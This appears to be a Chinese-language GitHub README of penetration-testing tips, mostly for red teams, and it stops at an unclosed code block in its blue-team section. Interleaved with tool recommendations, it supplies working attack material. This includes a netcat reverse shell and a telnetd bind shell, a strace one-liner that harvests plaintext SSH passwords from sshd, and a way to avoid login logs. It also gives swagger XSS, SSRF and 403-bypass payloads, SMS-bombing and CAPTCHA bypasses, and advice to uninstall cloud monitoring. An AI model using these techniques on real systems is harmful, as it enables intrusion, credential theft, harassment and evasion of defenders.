ffffffff0x/Pentest101: 一些关于渗透测试的Tips    https://github.com/ffffffff0x/Pentest101

# Pentest101

一些关于渗透测试的知识点

---

无论红队还是蓝队,干活之前先让客户保存好日志和备份.(在啰嗦我也要说,血的教训)

---

## 大纲

* [红队](#红队)
* [蓝队](#蓝队)
* [Linux](#linux)
* [Mac](#mac)
* [防蓝队](#防蓝队)
* [隐私保护](#隐私保护)
* [基础设施匿名化](#基础设施匿名化)

---

## 红队

临时邮箱 https://10minutemail.net/

姓名、手机号、身份证、统一社会信用代码、组织机构代码、银行卡生成 https://github.com/smxiazi/xia_Liao

---

这个工具可以通过网站csp策略发现子域名 https://github.com/edoardottt/csprecon

---

一些需要ip编码绕过的场景，可以使用 https://github.com/projectdiscovery/mapcidr 进行快速生成
```
echo 127.0.1.0 | mapcidr -if 0 -silent

127.0.1.0
127.1
0177.0.01.0
0x7f.0x0.0x1.0x0
0x7f000100
0xabfa659dfa7f000100
281472812450048
111111111111111101111111000000000000000100000000
0x7f.0.01.0x0
::ffff:7f00:0100
%31%32%37%2E%30%2E%31%2E%30
127.000.001.000
```

---

对于 iot 设备, 常用的 nc 或 bash 回弹往往是不可以用的, 这种时候可以用监听 telnet 服务的方法，拿到 shell
```
telnetd -l /bin/sh -p 1337
```

安装 telnet 工具后连接目标 1337 口即可
```
apt install inetutils-telnet
```

---

最常见的滑块验证码是通过SaaS接入的，但为了避免第三方服务器出问题影响业务的正常运营，通常会提供一个宕机模式（即第三方服务器出问题时可不用进行滑块验证码），攻击者利用这一点就可以让滑块验证码失效。

比如在请求中添加了个"xx_server_status":0，让服务端以为第三方服务宕机了，就不用进行滑块验证了，从而绕过了滑块验证。

> 来自文章 : https://mp.weixin.qq.com/s/RzDHjRbw6DnQxig_QFxV7Q

---

对前端加密比较有帮助的2个工具
- https://github.com/jxhczhl/JsRpc
- https://github.com/whwlsfb/BurpCrypto

---

红队有自建域前置的需求可以考虑用 [RedGuard](https://github.com/wikiZ/RedGuard) 这个工具

---

搜索各种 key 的正则

- burp
    ```
    (?i)((access_key|access_token|admin_pass|admin_user|algolia_admin_key|algolia_api_key|alias_pass|alicloud_access_key|amazon_secret_access_key|amazonaws|ansible_vault_password|aos_key|api_key|api_key_secret|api_key_sid|api_secret|api.googlemaps AIza|apidocs|apikey|apiSecret|app_debug|app_id|app_key|app_log_level|app_secret|appkey|appkeysecret|application_key|appsecret|appspot|auth_token|authorizationToken|authsecret|aws_access|aws_access_key_id|aws_bucket|aws_key|aws_secret|aws_secret_key|aws_token|AWSSecretKey|b2_app_key|bashrc password|bintray_apikey|bintray_gpg_password|bintray_key|bintraykey|bluemix_api_key|bluemix_pass|browserstack_access_key|bucket_password|bucketeer_aws_access_key_id|bucketeer_aws_secret_access_key|built_branch_deploy_key|bx_password|cache_driver|cache_s3_secret_key|cattle_access_key|cattle_secret_key|certificate_password|ci_deploy_password|client_secret|client_zpk_secret_key|clojars_password|cloud_api_key|cloud_watch_aws_access_key|cloudant_password|cloudflare_api_key|cloudflare_auth_key|cloudinary_api_secret|cloudinary_name|codecov_token|config|conn.login|connectionstring|consumer_key|consumer_secret|credentials|cypress_record_key|database_password|database_schema_test|datadog_api_key|datadog_app_key|db_password|db_server|db_username|dbpasswd|dbpassword|dbuser|deploy_password|digitalocean_ssh_key_body|digitalocean_ssh_key_ids|docker_hub_password|docker_key|docker_pass|docker_passwd|docker_password|dockerhub_password|dockerhubpassword|dot-files|dotfiles|droplet_travis_password|dynamoaccesskeyid|dynamosecretaccesskey|elastica_host|elastica_port|elasticsearch_password|encryption_key|encryption_password|env.heroku_api_key|env.sonatype_password|eureka.awssecretkey)[a-z0-9_ .\-,]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([0-9a-zA-Z\-_=]{8,64})['\"]
    ```
- vscode
    ```
    ((access_key|access_token|admin_pass|admin_user|algolia_admin_key|algolia_api_key|alias_pass|alicloud_access_key|amazon_secret_access_key|amazonaws|ansible_vault_password|aos_key|api_key|api_key_secret|api_key_sid|api_secret|api.googlemaps AIza|apidocs|apikey|apiSecret|app_debug|app_id|app_key|app_log_level|app_secret|appkey|appkeysecret|application_key|appsecret|appspot|auth_token|authorizationToken|authsecret|aws_access|aws_access_key_id|aws_bucket|aws_key|aws_secret|aws_secret_key|aws_token|AWSSecretKey|b2_app_key|bashrc password|bintray_apikey|bintray_gpg_password|bintray_key|bintraykey|bluemix_api_key|bluemix_pass|browserstack_access_key|bucket_password|bucketeer_aws_access_key_id|bucketeer_aws_secret_access_key|built_branch_deploy_key|bx_password|cache_driver|cache_s3_secret_key|cattle_access_key|cattle_secret_key|certificate_password|ci_deploy_password|client_secret|client_zpk_secret_key|clojars_password|cloud_api_key|cloud_watch_aws_access_key|cloudant_password|cloudflare_api_key|cloudflare_auth_key|cloudinary_api_secret|cloudinary_name|codecov_token|config|conn.login|connectionstring|consumer_key|consumer_secret|credentials|cypress_record_key|database_password|database_schema_test|datadog_api_key|datadog_app_key|db_password|db_server|db_username|dbpasswd|dbpassword|dbuser|deploy_password|digitalocean_ssh_key_body|digitalocean_ssh_key_ids|docker_hub_password|docker_key|docker_pass|docker_passwd|docker_password|dockerhub_password|dockerhubpassword|dot-files|dotfiles|droplet_travis_password|dynamoaccesskeyid|dynamosecretaccesskey|elastica_host|elastica_port|elasticsearch_password|encryption_key|encryption_password|env.heroku_api_key|env.sonatype_password|eureka.awssecretkey)[a-z0-9_ .\-,]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['"]([0-9a-zA-Z\-_=]{8,64})['"]
    ```

> 小技巧来自项目 : https://github.com/AbelChe/macos-all

---

推荐用 terraform 进行红队基础设施的快速部署,写好配置即可做到一键起 cs,一键配置域前置

---

内网找找 nacos,通过 CVE-2021-29441 进后台可以翻翻配置文件,可能有数据库连接配置和 accesskey 等内容

---

网站会加载很多 js 文件，通过浏览器调试就能全局搜索关键的东西，浏览器 F12 打开调试，ctrl+r 刷新，搜索密钥一般用到的参数关键词比如 secret accesskey corpid 等，通过这种方式搜索敏感信息找到密钥

---

一个通过 swagger 作为入口点的案例分享(没图,凑合着看吧)
1. 扫描发现 swagger 文档,找到其中一个未授权的文件下载接口
2. 判断目标为 linux, 下载读取 bash 的历史命令
3. 在历史命令中得知存在 redis 的服务, 及配置文件地址, 顺便扫端口看了下, 可通, 但有密码
4. 读取 redis 配置文件, 看 requirepass 参数
5. 常规套路, redis getshell

---

遇到了 swagger-ui 除了找接口测试信息泄漏、越权、注入、上传等，还可以直接 xss

```
/swagger-ui.html?configUrl=https://jumpy-floor.surge.sh/test.json
```

![](./assets/img/11.png)

> 来自文章 : https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/

---

java 应用中,ssrf 的点可以使用 jar 协议进行 Blind SSRF

```
jar:scheme://domain/path!/
jar:http://127.0.0.1!/
jar:https://127.0.0.1!/
jar:ftp://127.0.0.1!/
```

- `http://127.0.0.1:8999/ssrf/1?url=jar:http://www.ffffffff0x.com!/`

    ![](./assets/img/9.png)

- `http://127.0.0.1:8999/ssrf/1?url=jar:http://www.ffffffff0x1231edadada.com!/`

    ![](./assets/img/10.png)

---

各种环境变量的收集,可用于 log4j 或者配合其他漏洞 🤔
- https://github.com/Puliczek/awesome-list-of-secrets-in-environment-variables

---

以后测出 ssrf,深入利用可以打内网 log4j

---

各类云的 metadata 数据的汇总，可用于 ssrf 时的进一步利用
- https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b

---

通过 NPM 仓库做文件分发，可以用于后门文件的分发，域名白名单绕过，有被溯源风险，合理使用
- https://mp.weixin.qq.com/s/THbjQphUwelO0gSrsEz5IQ

---

这个文章里讲了redis 主从rce后如何恢复的方法
- https://mp.weixin.qq.com/s/YPLnYWsBMAYij7wXHVpodg

---

可以用于 bypass ja3 检测的工具库
- [Danny-Dasilva/CycleTLS](https://github.com/Danny-Dasilva/CycleTLS) - Spoof TLS/JA3 fingerprints in GO and Javascript
- [CUCyber/ja3transport](https://github.com/CUCyber/ja3transport) - Impersonating JA3 signatures
    - https://mp.weixin.qq.com/s/cX7-kHuIWebDH6r6UQ2I4w

---

分享2个 graphql 利用的辅助工具
- [swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap)
- [doyensec/inql](https://github.com/doyensec/inql)

还有一个 graphql 的靶场,可以实战试试
- [dolevf/Damn-Vulnerable-GraphQL-Application](https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application)

GraphQL 自省机制，默认情况下，任何未经身份验证的用户都可以分析 GrapQL 模式。Introspection 允许我们获取有关所有请求、mutation、订阅和数据类型的信息，以及向发出请求的客户端提供的所有其他信息。通过请求 ___schema 元字段可以轻松获得此信息，根据规范，该信息始终可用于“root”类型的查询。

```
Content-Type: application/json

{"query":"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}
```

---

一个用于 ip 反查的小工具, 出现新的漏洞 POC, 批量验证完, 快速确定 ip 所属企业，方便提交漏洞 https://github.com/Sma11New/ip2domain

---

找到了泄露的 Google Maps API 不知道怎么利用,可以使用 [gmapsapiscanner](https://github.com/ozguralp/gmapsapiscanner) 工具进行验证.

---

分享一个脚本, 可以在 linux 没有 curl 和 wget 的情况用 shell 实现下载功能(仅支持http)
```bash
#!/bin/bash
function DOWNLOAD() {

    local URL=$1

    if [ -z "${URL}" ]; then
        printf "Usage: %s \"URL\" [e.g.: %s http://www.xxx.com/test.json]" \
            "${FUNCNAME[0]}" "${FUNCNAME[0]}"
        return 1;
    fi

    read proto server path <<< "${URL//"/"/ }"
    DOC=/${path// //}
    HOST=${server//:*}
    PORT=${server//*:}
    [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

    exec 3<>/dev/tcp/${HOST}/$PORT
    echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
    while IFS= read -r line ; do
        [[ "$line" == $'\r' ]] && break
    done <&3
    nul='\0'
    while IFS= read -d '' -r x || { nul=""; [ -n "$x" ]; }; do
        printf "%s$nul" "$x"
    done <&3
    exec 3>&-
}

DOWNLOAD "$1"
```

> 来自文章 : https://zgao.top/linux%e5%9c%a8%e6%b2%a1%e6%9c%89curl%e5%92%8cwget%e7%9a%84%e6%83%85%e5%86%b5%e4%b8%8b%e5%a6%82%e4%bd%95%e7%94%a8shell%e5%ae%9e%e7%8e%b0%e4%b8%8b%e8%bd%bd%e5%8a%9f%e8%83%bd/

---

来回切换多个osint搜索引擎很麻烦,一个个导出更是耗费时间,建议你试试我们的多网络资产测绘引擎 API 命令行查询工具

- https://github.com/ffffffff0x/ones

目前支持 : chaos、hunter、quake、zoomeye、shodan、fofa

---

企业中经常把企业简称(jsxx)、工号(10086)、姓名全拼(zhangsan)、姓名带点(jing.zhang)等做为登录用户名，攻击者收集工号、邮箱名，或者直接生成用户名字典进行爆破，成功率非常高，这里推荐我们开源的工具来进行字典的生成

- https://github.com/ffffffff0x/name-fuzz

---

Redhat/CentOS 发行版下可以通过写恶意网卡配置文件进行命令执行的方式,条件比较受限,但也是一种方法,可以学习一下
- https://seclists.org/fulldisclosure/2019/Apr/24

```bash
sudo tee /etc/sysconfig/network-scripts/ifcfg-1337 <<-'EOF'
NAME=Network /bin/id  &lt;= Note the blank space
ONBOOT=yes
DEVICE=eth0
EOF

service network restart             # 重启网络管理触发
systemctl status network.service    # 可以看到 id 已经执行
```

![](./assets/img/8.png)

---

nuclei 目前支持了多个 dns 变量,以 www.ffffffff0x.com 为例
```
{{FQDN}}        # www.ffffffff0x.com
{{RDN}}         # ffffffff0x.com
{{DN}}          # ffffffff0x
{{TLD}}         # com
{{SD}}          # www
```

当存在需要根据目标域名进行生成相应 payload 的需求时, 推荐用 nuclei 的这些变量

---

uuid 是常用的唯一标识符,很好用,不过这里推荐一个可以用于替代的 uuid 的解决方案 : https://github.com/ai/nanoid ,速度更快,更安全,已被移植到多种语言中

---

在 burp 的 raw 包如果要编写为 python 脚本不是很难，但是如果经常有这种需求，其实也很麻烦, 分享一个技巧，可以从 raw 包转换为 Python, JavaScript, PHP, R, Go, Rust 等代码的形式
1. 从 Burp 复制 http 请求到 https://curl.se/h2c/ 转换为 curl 命令
2. 复制 curl 命令到 https://curlconverter.com/
3. 完善生成的脚本,添加你需要的功能,验证即可

> 来自文章 : https://medium.com/@wyv3rn/creating-easy-proof-of-concept-scripts-with-python-and-curl-5dca489c596b

如果嫌麻烦,也可以直接安装程序一条命令转换
```bash
npm install --global curlconverter
wget -O h2c https://raw.githubusercontent.com/curl/h2c/master/h2c && chmod +x h2c

sudo tee test.txt <<-'EOF'
POST /test/site/post.cgi HTTP/1.1
Host: example.com
User-Agent: moo
Shoesize: 12
Cookie: a=12; b=23
Content-Type: application/json
Content-Length: 57

{"I do not speak": "json"}
{"I do not write it": "either"}
EOF

./h2c < test.txt | curlconverter
./h2c < test.txt | curlconverter -l go
```

---

运用nuclei进行API密钥喷洒,不过国内环境要单独去写相应的yaml
- https://github.com/projectdiscovery/nuclei-templates/tree/master/token-spray

---

运用nuclei扫描配置错误的反代服务器的案例,值得学习
- https://blog.projectdiscovery.io/abusing-reverse-proxies-metadata/
- https://blog.projectdiscovery.io/abusing-reverse-proxies-internal-access/
- https://github.com/projectdiscovery/nuclei-templates/tree/master/misconfiguration/proxy
- https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/generic/request-based-interaction.yaml

---

https://www.acunetix.com/vulnerabilities/web/ - awvs 的漏洞检测用例,里面有详细的漏洞描述,修复建议,和参考链接

---

https://cs.github.com/ - github 的新版搜索引擎,可以用于 OSINT 的搜索,具体案例可以参考这篇文章 https://www.sshell.co/github-code-search/

---

想学习 nuclei 不知道怎么用? 推荐你看看我这篇笔记 https://github.com/ffffffff0x/1earn/blob/master/1earn/Security/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/nuclei.md

---

生成社工字典时可以根据目标单位名称、负责人姓名、手机号、邮箱等

使用 https://github.com/mozillazg/python-pinyin 库

提供 中国张三商业公司 , 输出 zgzssygs 配合常见的密码后缀 @123456、@2021 等可以构造出更加具有针对性的社工字典

---

nmap 官方列出了在电影里出现了 nmap 的场景,并一一作出解释 🤣
- https://nmap.org/movies/

---

burp的扫描增强插件
- [wagiro/BurpBounty](https://github.com/wagiro/BurpBounty) - Burp Bounty (Scan Check Builder in BApp Store) is a extension of Burp Suite that allows you, in a quick and simple way, to improve the active and passive scanner by means of personalized rules through a very intuitive graphical interface.

还有一个很不错的配置文件项目
- https://github.com/Sy3Omda/burp-bounty - Burp Bounty is extension of Burp Suite that improve Burp scanner.

---

自建 dnslog 服务可以使用 https://github.com/chennqqi/godnslog

---

有时候进到后台,导出的一些数据可能是 json 格式的,这个时候可以用 linux 下的 jq 工具,快速处理 json 数据,导出成你需要的格式.

例如:
```bash
wget https://raw.githubusercontent.com/modood/Administrative-divisions-of-China/master/dist/pcas.json
cat pcas.json | jq '."北京市"' > out.txt        # 获取北京市所有辖区、街道信息
cat pcas.json | jq '."北京市"."市辖区"' > out.txt
cat pcas.json | jq '."北京市"."市辖区"."东城区"' > out.txt      # 获取北京市东城区所有街道信息
```

通过获取的信息,进一步构造字典或者其他的,用于扩大战果

---

很多师傅的 blog 提供了 rss 订阅,我个人推荐一个 rss 阅读的chrome插件: [Feedbro](https://chrome.google.com/webstore/detail/feedbro/mefgmmbdailogpfhfblcnnjfmnpnmdfa?hl=en)

及时阅读新的文章,跟上师傅们的步伐.

---

projectdiscovery 的 [chaos](https://chaos.projectdiscovery.io/#/) 是收集 src 资产的不错途径

---

在 vps 上跑扫描任务经常由于网络波动掉 ssh 连接, 此时 shell 里执行的任务也被断掉了, 针对这种情况，可以试试虚拟 shell, 比如 screen , tmux , 虚拟 shell 在你断掉 ssh 连接时不会 kill 掉任务, 很好用,可以试一试

---

拿下 linux 机器,可以运行下 `last` 如果是内网机器,可以发现运维管理员的 ip 段,精准定位目标

也可以看下防火墙信息 `iptables --list` 也会有所收获

---

翻数据库密码可以注意 `history` 记录也可以看下 `/root/.mysql_history` 文件

---

偶尔跑1、2个脚本安装一下模块还是挺恼人的

如果经常写 python 脚本,可以使用 pipreqs 生成自己的 requirements.txt 文件,这样方便在更换主机的时候快速部署好运行环境

---

浏览器内打开 cmd
```
ms-settings:clipboard?activationSource=
```

火狐
```
telnet:///
irc:///
ircs:///
mailto:///
webcal:///
```

---

有 wsdl/soap 不知道怎么测?除了老版本awvs以外可以使用 [soapui](https://github.com/SmartBear/soapui#build-and-run) 直接抓取目标接口,也可用 burp 插件 [Wsdler](https://github.com/NetSPI/Wsdler)

还有一个 ReadyAPI 可以自动 fuzz,不过使用实在是太不方便了

---

避免记录登录日志的小技巧
```bash
ssh -T user@host /bin/bash -i
```

-T 代表不要分配 tty，-i 代表要一个交互型的 bash
> 来自文章 : [Linux 系统日志小结](https://www.tr0y.wang/2021/06/15/linux-system-log/)

---

如何关闭 http://burp 防止蜜罐探测
- Proxy - Options - Miscellaneous - Disable web interface at http://burp

![](./assets/img/7.png)

---

检测暗链的小技巧,使用爬虫的 user-agent 遍历访问目标,对比 title 和内容
- https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/http/Spider.txt

---

DNS收集的优先级 被动+爬取+过滤 > 主动扫描+爆破
- 可以使用这种思路 rapid7公共数据集+js爬取+Github等第三方爬取+subfinder+OneForAll+ksubdomain过滤

---

对于未知的webshell，可以尝试爆破路径、密码
- webshell路径字典 : https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/Webshell/Fuzz_dir.txt
- webshell密码字典 : https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/Webshell/Fuzz_webshell_pass.txt

也加一些参数,尝试报错,看会不会有密码

---

nc 用的不爽可以尝试换个 reverse-shell 工具,推荐个 https://github.com/nodauf/Girsh ,go写的,可以自动检测OS并执行正确的命令，将其升级为一个完整的交互式反向shell。

![](./assets/img/5.png)

---

从反编译的 apk 文件中提取相关域名链接/IP
```bash
grep -E "([0-9]{1,3}[\.]){3}[0-9]{1,3}" -r xxx --color=auto
grep -E "https?://[a-zA-Z0-9\.\/_&=@$%?~#-]*" -r xxx --color=auto
```

---

通过正则从 apk 中提取一些敏感信息
```bash
apktool d app_name.apk
grep -EHirn "accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into" APKfolder/
```

---

如果登录系统设置了 IP 地址白名单,我们可以通过修改 http 头字段伪造 IP 地址
- http 头字段字典 : https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/http/Fuzz_head.txt

或者直接修改 host 头
```
curl -v -H "Host: localhost" https://target/
wget -d --header="Host: localhost" https://target/
```

---

有时候文件太大,想先确认一下文件结构和部分内容,这时可以使用 remotezip,直接列出远程 zip 文件的内容，而无需完全下载,甚至可以远程解压,仅下载部分内容
```bash
pip3 install remotezip
remotezip -l "http://site/bigfile.zip"          # 列出远程zip文件的内容
remotezip "http://site/bigfile.zip" "file.txt"  # 从远程zip⽂件解压出file.txt
```

---

URL跳转漏洞字典: https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/api_param/Fuzz_Redirect.txt

---

burp 在忽略目标的时候是配置 Intercept Client Requests , 但是这个选项不支持批量导入, 只能一条一套的添加, 非常反人类, 所以 windows 下可以通过 Proxifier 配置 Rules 做到忽略指定的 host

![](./assets/img/4.png)

附赠一个 Target hosts 列表
- https://github.com/ffffffff0x/AboutSecurity/blob/master/Payload/Burp/Proxifier_filter.txt

---

npm 和 github 加速可以使用 jsdelivr 的 cdn 进行加速,但 jsdelivr 不支持 release 的发布文件下载,可以采用 cf worker 部署的代理服务进行加速

---

在 linux 中不知道当前用户可用什么命令，可以使用下面的命令，这条命令可以列出所有可用的命令(有点拗口)
```
compgen -c
```

---

火绒拦截扫描，如何关闭拦截？
- 火绒>网络防护>基础防护中关闭

![](./assets/img/1.png)

---

druid 未授权访问常见路径
- /druid/websession.html
- /system/druid/websession.html
- /webpage/system/druid/websession.html

---

爆破目标用户名时应考虑如下可能：
- 撞库
- 常见手机号
- 常见登录账号(admin、manager、test、deme)
- 数字组合(0-9、00-99、000-999、0000-9999、00000-99999)
- 拼音(zhangsan、zhang.san、zhangs)
- 中文(张三、李四、张san)
- 英文名(Tom、Jeo、Cherry)
- 单位名(zssx123、zssx@123)
- 地名(beijing123、beijing@123)
- 组合(地名+单位名)
- 域名(baidu@123、JD@123)
- 生日组合

---

整理字典时，推荐用linux下的工具快速合并和去重
```bash
cat file1.txt file2.txt fileN.txt > out.txt
sort out.txt | uniq > out2.txt
```

---

信息收集小技巧，仔细观察目标页面的js路径，多找几个js目录，专门用js字典进行爆破，获取的js脚本列表，再调用工具去匹配路径和凭证。

---

有时一些上传点没有过滤,但你访问文件是通过函数调用获取文件,这个时候可以先测下任意文件读,然后尝试get改为post在测试任意文件读,如果存在,尝试通过任意文件读找路径

---

打某一个行业想要有成果，最好要深入了解这个行业，我举个例子，比如搞传奇/dnf这种私服的，他们讲管理员都叫gm，不像搞IT的叫admin，那你爆一些私服游戏的网页后台、管理账号就需要搞一些行业黑话生成一下，比如/gm/或者/chongzhi/gm.php,用IT行业的字典，水土不服🤣，还有菠菜行业，注册用户需要6位邀请码，很多都是888888、666666这种吉利数字，逆向一下思路，猜一猜目标受众喜欢什么。

---

我们在后渗透过程中经常要传 payload 到目标，临时起的文件服务器都是 python 一条命令的事
- Python 2.x
    ```bash
    python -m SimpleHTTPServer 8000
    # 在当前目录起个 8000 端口的 HTTP 服务
    ```
- Python 3.x
    ```bash
    python -m http.server 8000 --bind 0.0.0.0
    ```
- 推荐一个可以加密码的，一条命令python服务器模块
    ```
    pip3 install updog
    updog --port 8888 --password test1234
    ```

---

一般来说,某些场景多个服务是协同的关系,比如就这个 LiveCMS 服务一定和下面的监控设备有连接，不然日志不会这么大，可以搞一搞下级监控，也可以专门搞一搞这个 LiveCMS 和 LiveSMS、LiveGBS 试试
LiveCMS 端口使用
- TCP 端口 : 5060(SIP), 10000(HTTP), 26379(Redis)
- UDP 端口 : 5060(SIP)

LiveSMS : SIP 流媒体服务, 根据需要可部署多套
- TCP 端口 : 5070(SIP), 10001(HTTP), 11935(RTMP Live), 30000-40000(RTP over TCP)
- UDP 端口 : 5070(SIP), 50000-60000(RTP/RTCP over UDP)

---

有时候我们拿了一台 docker 机器，发现没有 ifconfig 命令也没有 ip 命令，不清楚怎么看 IP，这时候可以通过查看 proc 文件的方式来查看
```bash
cat /proc/net/fib_trie
cat /etc/sysconfig/network
```

---

渗透时遇到某些上传点未作过滤，但负载均衡做了过滤后缀名的情况，可以上传 webshell 命名为 index.php，然后访问 xxx.com/xxx/upload, 尝试 bypass 反代的策略

---

当渗透时遇到了 403 或者 302、401 的拒绝访问，不要怕，多 FUZZ 几次
- 从 HTTP Header 层面 bypass
    ```bash
    GET /admin HTTP/1.1
    Host: web.com   # ===> 403

    GET /anything HTTP/1.1
    Host: web.com
    X-Original-URL: /admin  # ===> 200

    GET /anything HTTP/1.1
    Host: web.com
    Referer: https://web.com/admin  # ===> 200

    GET https://qq.com HTTP/1.1
    Host: web.com   # ===> SSRF
    ```

- 从 URL 参数层面 bypass
    ```bash
    /admin/panel    # ===> 403
    /admin/monitor  # ===> 200

    /admin/monitor/;panel   # ===> 302
    ```
    ```bash
    web.com/admin   # ===> 403

    web.com/ADMIN       # ===> 200
    web.com/admin/      # ===> 200
    web.com/admin/.     # ===> 200
    web.com//admin//    # ===> 200
    web.com/./admin/./  # ===> 200
    web.com/./admin/..  # ===> 200
    web.com/%2f/admin/  # ===> 200
    web.com/admin.json  # ===> 200(ruby)

    web.com/%2e/admin   # ===> 200
    web.com/%252e/admin # ===> 200
    web.com/%ef%bc%8fadmin  # ===> 200

    web.com/admin       # ===> 302
    web.com/admin..;/   # ===> 200
    ```

- 从协议层面 bypass
    ```bash
    http://web.com/admin    # ===> 403
    https://web.com/admin   # ===> 200
    ```

---

当我们拿下 windows 机器时可以通过抓内存中的密码进行横向，但 linux 却不可能抓到内存中的密码，但是 Debian 系列下的 linux 系统可以通过监听 sshd 进程的数据抓取出明文密码，比如你拿下了一台管理员机器，上面有 xshell，你可以手动开一个监听，在开一个登录，监听的窗口上就抓出密码了
```bash
strace -xx -fp `cat /var/run/sshd.pid` 2>&1| grep --line-buffered -P 'write\(\d, "\\x00' | perl -lne '$|++; @F=/"\s*([^"]+)\s*"/g;for (@F){tr/\\x//d}; print for @F'|grep --line-buffered -oP '.{8}\K([2-7][0-9a-f])*$'|grep --line-buffered -v '^64$'|perl -pe 's/([0-9a-f]{2})/chr hex $1/gie'
```

当然你也可以直接用工具抓 xshell 存的密码
- [Arvanaghi/SessionGopher](https://github.com/Arvanaghi/SessionGopher) - 使用 WMI 提取 WinSCP、PuTTY、SuperPuTTY、FileZilla 和 Microsoft remote Desktop 等远程访问工具保存的会话信息的 ps 脚本
- [uknowsec/SharpDecryptPwd](https://github.com/uknowsec/SharpDecryptPwd) - 对密码已保存在 Windwos 系统上的部分程序进行解析,包括：Navicat,TeamViewer,FileZilla,WinSCP,Xmangager 系列产品(Xshell,Xftp)。

---

渗透时尽量不要暴露自己的 IP 地址，挂代理是必须的
- linux 下要查看自己终端是否走代理可以 curl https://ifconfig.me/ 看下返回的 IP 地址
- windows 就直接访问 https://ifconfig.me/ 即可

---

linux 下代理不用多说, proxychains-ng，windows 下推荐用 Proxifier

---

MSF 和 CS 中 Stage 与 Stageless 的区别
- Stage ： 先传一个 shellcode，然后回连端口，加载恶意 metsrv，然后再请求 stdapi 于 priv，进行上线
- Stageless ： 将 shellcode、metsrv、stdapi、priv 打包，一次性传完
- 如果想让 msf 直接回弹到 NC，那么必须要用 stageless

---

判断目标主机是不是虚拟机、容器
- windows
    - cmd : systeminfo
    - Powershell : get-wmiobject win32_computersystem | fl model
- linux
    ```bash
    lshw -class system | grep -i VM & grep -i virtual
    dmesg | grep -i VM & grep -i virtual
    dmidecode -s system-product-name
    ls /tmp
    systemd-detect-virt
    virt-what
    ls -alh /.dockerenv
    cat /proc/1/cgroup
    ```

---

msf 框架其实有许多 UI 界面的工具, 可以帮助不习惯命令行的渗透测试人员进行渗透，我举几个例子
- https://github.com/FunnyWolf/Viper
- https://github.com/WayzDev/Kage

---

在进行云主机后渗透时，如果触发敏感操作，会有短信提醒到管理员手机上，这个时候可以酌情考虑卸载云主机的监控 (有时你用云主机装 SSR 会无法连接也是这个原因)

---

rlwrap 工具，可以完美解决各类 shell 中无法上下左右的问题

例如 ，回弹了 shell，手贱按了上，这种情况(我想你一定遇到过🤣🤣🤣🤣)
- 安装：
    ```bash
    apt install rlwrap
    ```
- 使用：
    ```bash
    rlwrap [Command]
    ```

---

cAdvisor 是 Google 出品的用于监控 Docker 容器的服务，渗透时遇到这个服务基本上是存在容器环境

---

新版 kali 2020 版后使用 root 账号默认不给密码，如果你想,可以直接进行修改 : sudo passwd root

---

nc 具有多个版本, 比如: traditional、openbsd、ncat
- traditional 最老的版本,支持最基本的功能
- openbsd 安全版本,回弹要用一大段命令
    ```bash
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
    ```
- ncat 新版本, 重构了旧版的代码并支持了许多新功能, debian 系列发行版下通过以下命令进行安装配置
    ```bash
    apt install -y ncat
    update-alternatives --set nc /usr/bin/ncat
    ```

---

程序溢出，int 最大值为 2147483647，可尝试使用该值进行整数溢出，观察现象。
> 来自项目 : [Power7089/PenetrationTest-Tips](https://github.com/Power7089/PenetrationTest-Tips)

---

图片验证码可设置为空，如：code=undefined
> 来自项目 : [Power7089/PenetrationTest-Tips](https://github.com/Power7089/PenetrationTest-Tips)

也可以使用字典进行 fuzz
- https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/api_param/Fuzz_imagesize.txt

---

任意文件下载：/porc/self/cmdline -- 当前进程的 cmdline 参数，/var/lib/mlocate/mlocate.db -- 全文件路径。
> 来自项目 : [Power7089/PenetrationTest-Tips](https://github.com/Power7089/PenetrationTest-Tips)

---

- 138888888889   12 位经过短信网关取前 11 位，导致短信轰炸
- 短信轰炸绕过：手机号前加 + 86 有可能会绕过，手机号输入邮箱，邮箱处输入手机号
- 手机号码前后加空格，86，086，0086，+86，0，00，/r,/n, 以及特殊符号等
- 手机号前加若干 + 会造成短信轰炸
- 获取短信验证码时，用逗号隔开两个手机号，有可能两个手机号能获取到同一个验证码
> 来自项目 : [Power7089/PenetrationTest-Tips](https://github.com/Power7089/PenetrationTest-Tips)

---

## 蓝队

通过 eBPF hook 系统的 libssl ,从而不需要装ca证书也可以抓https的包，很不错的项目，在应急响应和主机监控中会很有用
- https://github.com/ehids/ecapture

---

jq,但是是用于文件的 https://github.com/wader/fq

---

推荐一个不错的恶意文件分析工具 https://github.com/mandiant/capa

---

流量分析除了 wireshark 用科来的工具进行分析也是个不错的选择，有时候做 ctf 的分析题，直接用科来工具打开就可以发现异常包，还是挺有帮助的

---

CobaltStrike 的 Fofa 语法
```
